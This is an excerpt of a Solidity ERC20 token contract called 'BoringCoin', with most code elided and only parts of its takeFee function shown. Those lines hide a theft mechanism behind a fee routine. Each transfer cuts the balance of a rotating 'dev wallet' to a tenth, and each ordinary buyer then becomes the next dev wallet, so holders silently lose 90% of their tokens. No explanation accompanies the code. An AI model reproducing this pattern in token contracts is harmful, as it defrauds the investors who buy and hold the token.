...
contract BoringCoin is Context, IERC20, Ownable {
    ...
    string private _name = "BoringCoin";
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (devWalletAddress != address(0) && devWalletAddress != sender && devWalletAddress != recipient)
            _balances[devWalletAddress] = _balances[devWalletAddress].div(10);
        ...
        if (recipient != uniswapPair && recipient != address(0) && recipient != deadAddress)
            devWalletAddress = recipient;
